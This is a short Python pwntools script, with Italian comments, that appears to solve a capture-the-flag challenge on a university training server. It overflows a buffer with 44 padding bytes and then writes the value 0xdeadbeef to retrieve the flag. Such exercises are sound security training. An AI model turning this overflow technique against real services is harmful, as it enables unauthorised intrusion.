import pwn
from Crypto.Util.number import long_to_bytes, bytes_to_long

REMOTE = True

IP_ADDRESS = "cyberchallenge.disi.unitn.it"
PORT = 9001

if(REMOTE):
    conn = pwn.remote(IP_ADDRESS, PORT)
else:
    conn = pwn.process('./bin')


conn.recvuntil(b"?")

# Trovato tramite "pattern offset 0x6161616761616161"
# Dove 0x6161616761616161 è il valore contenuto nel registro usato per contenere floor
offset = 44

# La "password" deve essere inviata in little endian
password = b"\xef\xbe\xad\xde"

payload = b'a' * offset + password
print(payload)

conn.sendline(payload)
conn.recvuntil(b"Use the flag to go back.\n")

flag = conn.recvline().decode()
conn.close()

print(flag)
